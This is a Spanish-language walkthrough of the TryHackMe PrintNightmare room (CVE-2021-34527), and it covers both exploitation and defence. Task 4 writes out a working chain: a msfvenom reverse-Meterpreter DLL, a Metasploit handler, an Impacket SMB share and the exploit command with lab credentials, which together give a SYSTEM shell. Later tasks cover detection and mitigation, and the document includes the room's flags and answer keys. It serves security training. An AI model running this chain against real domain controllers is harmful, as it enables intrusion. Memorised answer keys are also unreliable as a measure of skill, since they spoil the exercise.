# PrintNightmare

| **Dificultad** | Medium |
| **Tipo** | Walkthrough |
| **Slug** | printnightmare |
| **Link** | [TryHackMe](https://tryhackme.com/room/printnightmare) |
| **Sección** | 02 Level Medium |
| **Fuente** | Web (API THM `api/v2/rooms/tasks?roomCode=printnightmare` + walkthrough jesusgavancho/THM) |
| **Componentes** | Windows Print Spooler, DCE/RPC (`RpcAddPrinterDriverEx`), Metasploit, Impacket (`smbserver.py`, `rpcdump.py`), msfvenom, Windows Event Logs, Sysmon, Wireshark |
| **Impacto** | Alto — RCE como SYSTEM en Domain Controllers con el Print Spooler habilitado (CVE-2021-34527) |

---

**Contexto:** La room cubre la vulnerabilidad **PrintNightmare** (CVE-2021-1675 y CVE-2021-34527) desde un punto de vista ofensivo y defensivo. Microsoft la define como "una vulnerabilidad de ejecución remota de código que existe cuando el servicio Windows Print Spooler realiza incorrectamente operaciones de archivos con privilegios". Se explica cómo explotarla contra un Domain Controller Windows 2019 y cómo detectarla/mitigarla usando Windows Event Logs, Sysmon, análisis de paquetes (Wireshark) y políticas de defensa.

Aspecto clave de la vulnerabilidad: el servicio ejecuta el DLL con privilegios de **SYSTEM**, por lo que un DLL malicioso cargado como driver de impresión concede privilegios totales. Requiere un usuario de bajo privilegio autenticado contra el spooler.

## Solucionario

### Task 1: Introduction

**Explicación:** Tarea introductoria de solo lectura. Presenta los objetivos de aprendizaje de la room (qué es PrintNightmare, cómo explotarlo, mecanismos de detección con Windows Event Logs y Wireshark) y los pre-requisitos (Wireshark, Windows Event Logs, fundamentos de Linux y Meterpreter).

| # | Pregunta | Respuesta |
| 1 | (Confirmación de lectura introductoria) | `No answer needed` |

---

### Task 2: Windows Print Spooler Service

**Explicación:** El **Print Spooler** es un servicio de Windows, habilitado por defecto en todos los clientes y servidores, que gestiona los trabajos de impresión: recibe los archivos a imprimir, los encola y los programa. Los Domain Controllers lo usan principalmente para *printer pruning* (eliminar impresoras de la red dadas de alta en AD que ya no se usan). Se puede iniciar/detener/pausar/reanudar desde la consola **Services** (`services.msc`).

Hay un aspecto fundamental para esta room: aunque no tengas conexión de escritorio, el servicio se gestiona con:

```
Get-Service -Name Spooler
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

| # | Pregunta | Respuesta |
| 1 | Where would you enable or disable Print Spooler Service? | `Services` |

---

### Task 3: Remote Code Execution Vulnerability

**Explicación:** Ambos CVE comparten nombre ("Windows Print Spooler Remote Code Execution Vulnerability") y afectan al Print Spooler, pero diferen en el **vector de ataque**:

- **CVE-2021-1675**: el atacante necesita acceso **directo o local** a la máquina para usar un DLL malicioso y escalar privilegios (LPE).
- **CVE-2021-34527 (PrintNightmare** propiamente dicho**): el atacante puede inyectar el DLL malicioso **remotamente** (RCE).

**Timeline clave:**
- 8/jun/2021 — Microsoft parchea CVE-2021-1675 como escalada de privilegios.
- 21/jun/2021 — Microsoft reclasifica a RCE.
- 27/jun/2021 — QiAnXin publica un vídeo demostrando LPE y RCE.
- 2/jul/2021 — Microsoft asigna **CVE-2021-34527** (PrintNightmare).
- 6/jul/2021 — Parche out-of-band + workarounds.

**Por qué es peligrosa:** explotable por red (sin acceso directo), PoC público (`github.com/cube0x0/CVE-2021-1675`) y el servicio está **habilitado por defecto** en Domain Controllers con privilegios SYSTEM.

| # | Pregunta | Respuesta |
| 1 | Provide the CVE of the Windows Print Spooler Remote Code Execution Vulnerability that doesn't require local access to the machine. | `CVE-2021-34527` |
| 2 | What date was the CVE assigned for the vulnerability in the previous question? (mm/dd/yyyy) | `07/02/2021` |

---

### Task 4: Try it yourself!

**Explicación:** Explotación guiada de un Domain Controller Windows 2019. Pasos:

1. Preparar el Attack Box: desinstalar `impacket` y `pyasn1` conflictivos e instalar `pyasn1` (> 0.4.2), luego clonar el exploit `github.com/tryhackme/CVE-2021-1675` e `impacket`.
2. Crear el DLL malicioso con `msfvenom` (reverser Meterpreter x64):

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATACANTE> LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll
```

3. Configurar el handler en Metasploit:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <ATACANTE>
set lport 4444
run -j
```

4. Hostear el DLL en un share SMB con Impacket y confirmar la vulnerabilidad:

```
smbserver.py share /root/Desktop/share/ -smb2support
rpcdump.py @10.10.118.174 | egrep 'MS-RPRN|MS-PAR'
```

5. Ejecutar el exploit con las credenciales de un usuario de bajo privilegio:

```
python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.118.174 '\\192.168.0.100\share\malicious.dll'
```

El exploit usa el protocolo **MS-RPRN (Print System Remote Protocol)** sobre el named pipe `\PIPE\spoolss`. Al recibir la sesión Meterpreter como `NT AUTHORITY\SYSTEM` se lee la flag del escritorio de Administrator:

```
meterpreter > search -f flag.txt
meterpreter > cat 'c:\Users\Administrator\Desktop\flag.txt'
```

| # | Pregunta | Respuesta |
| 1 | What is the flag residing on the Administrator's Desktop? | `THM{SiGBQPMkSvejvmQNEL}` |

---

### Task 5: Indicators of Compromise

**Explicación:** Para cazar el ataque (threat hunting) hay que buscar los siguientes indicadores:

- `spoolsv.exe` lanzando `rundll32.exe` como proceso hijo **sin argumentos**.
- DLL malicioso dropeado en `%WINDIR%\system32\spool\drivers\x64\3\` y DLLs cargados desde `...\3\Old\`.
- Procesos hijo sospechosos de `spoolsv.exe` (`cmd.exe`, `powershell.exe`, ...).
- Uso de Mimikatz (crearía un driver de impresión "QMS 810"; detectable con Sysmon ID 13).
- DLLs de PoCs públicos: `MyExploit.dll`, `evil.dll`, `addCube.dll`, `rev.dll`, `rev2.dll`, `main64.dll`, `mimilib.dll` (detectables con Event ID 808 en PrintService).

El código del exploit llama a la función **`pcAddPrinterDriverEx()`** desde la cuenta autenticada para instalar un driver de impresión (el DLL malicioso) y usa **`rpcdump.py`** para escanear servidores vulnerables.

Splunk además aporta queries de detección, por ejemplo detectando `spoolsv.exe` con un hijo `rundll32.exe`, o fallos al cargar un plug-in nuevo de impresora:

```
source="WinEventLog:Microsoft-Windows-PrintService/Admin" ((ErrorCode="0x45A" (EventCode="808" OR EventCode="4909")) OR ("The print spooler failed to load a plug-in module" OR "\\drivers\\x64\\"))
```

| # | Pregunta | Respuesta |
| 1 | Provide the first folder path where you would likely find the dropped DLL payload. | `C:\Windows\System32\spool\drivers\x64\3\` |
| 2 | Provide the function that is used to install printer drivers. | `pcAddPrinterDriverEx()` |
| 3 | What tool can the attacker use to scan for vulnerable print servers? | `rpcdump.py` |

---

### Task 6: Detection: Windows Event Logs

**Explicación:** Los logs de actividad del Print Spooler son:
- `Microsoft-Windows-PrintService/Admin`
- `Microsoft-Windows-PrintService/Operational`

**Event IDs útiles:**
- **316** (Operational): "Printer driver [file] for Windows x64 Version-3 was added or updated" — driver añadido/actualizado.
- **808** (Admin): un source de seguridad intentó registrarse (detecta drivers sin firmar y DLLs maliciosos cargados por `spoolsv.exe`).
- **811** (Operational): fallos de operación; da la ruta completa del DLL dropeado.
- **31017** (SMBClient/Security): drivers sin firmar cargados por spoolsv.
- **7031** (System): terminación inesperada del servicio Print Spooler.
- Sysmon **3** (Network connection), **11** (FileCreate; mirar `C:\Windows\System32\spool\drivers\x64\3`), **23/26** (FileDelete).

**Artefactos encontrados en la investigación:**

```
Event ID 808:  The print spooler failed to load a plug-in module
               C:\Windows\system32\spool\DRIVERS\x64\3\svch0st.dll, error code 0x45A
Event ID 7031: The Print Spooler service terminated unexpectedly. Done 1 time(s).
Sysmon 3:      rundll32.exe (NT AUTHORITY\SYSTEM, PID 7108) -> 10.10.210.100:4747 (ip-10-10-210-100.eu-west-1.compute.internal)
Sysmon 11:     spoolsv.exe (PID 2244) -> C:\Windows\System32\spool\drivers\x64\3\New\svch0st.dll  (2021-08-13 17:33:40.673)
```

| # | Pregunta | Respuesta |
| 1 | Provide the name of the dropped DLL, including the error code. (no space after the comma) | `svch0st.dll,0x45A` |
| 2 | Provide the event log name and the event ID that detected the dropped DLL. (no space after the comma) | `Microsoft-Windows-PrintService/Admin,808` |
| 3 | Find the source name and the event ID when the Print Spooler Service stopped unexpectedly and how many times was this event logged? (format: answer,answer,answer) | `Service Control Manager,7031,1` |
| 4 | After some threat hunting steps, you are more confident now that it's a PrintNightmare attack. Hunt for the attacker's shell connection. Provide the log name, event ID, and destination port. (format: answer,answer,answer) | `Microsoft-Windows-Sysmon/Operational,3,4747` |
| 5 | Oh no! You think you've found the attacker's connection. You need to know the attacker's IP address and the destination hostname in order to terminate the connection. Provide the attacker's IP address and the hostname. (format: answer,answer) | `10.10.210.100,ip-10-10-210-100.eu-west-1.compute.internal` |
| 6 | A Sysmon FileCreated event was generated and logged. Provide the full path to the dropped DLL and the earliest creation time in UTC. (format:answer,yyyy-mm-dd hh-mm-ss) | `C:\Windows\System32\spool\drivers\x64\3\New\svch0st.dll,2021-08-13 17:33:37` |

---

### Task 7: Detection: Packet Analysis

**Explicación:** El atacante se apoya en comandos DCE/RPC `RpcAddPrinterDriver` / `RpcAddPrinterDriverEx`, pero su detección vía red no es trivial porque existen usos legítimos. La cosa se complica aún más si el exploit envuelve las llamadas DCE/RPC en **cifrado SMB3** (como hace este PoC), lo que obliga a fijarse en los paquetes SMB legibles del handshake.

Análisis del PCAP en Wireshark:
- Buscar `.local` → aparece la sesión del usuario `lowprivlarry` en el dominio `WIN-1O0UJBNP9G7.printnightmare.local`.
- Buscar `.dll` → se encuentra `letmein.dll` con el tree `\\10.10.124.236\sharez` (UNC donde se hospedaba el DLL).
- El payload de transferencia aparece como "Encrypted SMB3 data".

| # | Pregunta | Respuesta |
| 1 | What is the host name of the domain controller? | `WIN-1O0UJBNP9G7` |
| 2 | What is the local domain? | `printnightmare.local` |
| 3 | What user account was utilized to exploit the vulnerability? | `lowprivlarry` |
| 4 | What was the malicious DLL used in the exploit? | `letmein.dll` |
| 5 | What was the attacker's IP address? | `10.10.124.236` |
| 6 | What was the UNC path where the malicious DLL was hosted? | `\\10.10.124.236\sharez` |
| 7 | There are encrypted packets in the results. What was the associated protocol? | `SMB3` |

---

### Task 8: Mitigation: Disable Print Spooler

**Explicación:** Tras confirmar el ataque en THMDepartment, la mitigación es deshabilitar el Print Spooler en todos los Domain Controllers.

**1. Comprobar si el servicio está en marcha:**

```
Get-Service -Name Spooler
```

**2. Opción 1 — Deshabilitar el servicio (elimina impresión local y remota):**

```
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

**3. Opción 2 — Bloquear la impresión remota entrante por Group Policy:** `Computer Configuration / Administrative Templates / Printers` → deshabilitar la política **"Allow Print Spooler to accept client connections"**. Bloquea el vector remoto pero la impresión a un dispositivo local conectado directamente sigue funcionando. Recordar `gpupdate /force`.

**4. Ajustes de registro adicionales (por seguridad, deben estar en 0 o sin definir):** bajo `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint`: `NoWarningNoElevationOnInstall = 0` y `UpdatePromptSettings = 0`. El valor 1 en `NoWarningNoElevationOnInstall` deja el sistema vulnerable por diseño.

| # | Pregunta | Respuesta |
| 1 | Provide two ways to manually disable the Print Spooler Service. (format: answer,answer) | `PowerShell,Group Policy` |
| 2 | Where can you disable the Print Spooler Service in Group Policy? (format: no spaces between the forward slashes) | `Computer Configuration/Administrative Templates/Printers` |
| 3 | Provide the command in PowerShell to detect if Print Spooler Service is enabled and running. | `Get-Service -Name Spooler` |

---

### Task 9: Conclusion

**Explicación:** Cierre de la room. Resumen de que THMDepartment está a salvo y repaso de los mecanismos aprendidos: explotación ofensiva con Impacket/Metasploit y defensa con Event Logs, Sysmon, análisis de red y políticas de mitigación.

| # | Pregunta | Respuesta |
| 1 | (Cierre de la room) | `No answer needed` |

---

**Metodología:** Explotación de Windows Print Spooler (CVE-2021-34527) + DFIR / Threat Hunting con Windows Event Logs, Sysmon y análisis de paquetes.

**Learning chain:** Servicios de impresión → vector de ataque de RPC (MS-RPRN / pcAddPrinterDriverEx) → explotación con Impacket + Metasploit → detección con Event IDs (808, 7031, 316, 811, 31017) y Sysmon (3, 11) → análisis de pcap con cifrado SMB3 → mitigación por Group Policy y PowerShell.

**MITRE ATT&CK:** T1068 – Exploitation for Privilege Escalation; T1543.003 – Create or Modify System Process: Windows Service; T1213 – Data from Information Repositories; T1005 – Data from Local System.

**Fuente:** [TryHackMe - PrintNightmare](https://tryhackme.com/room/printnightmare)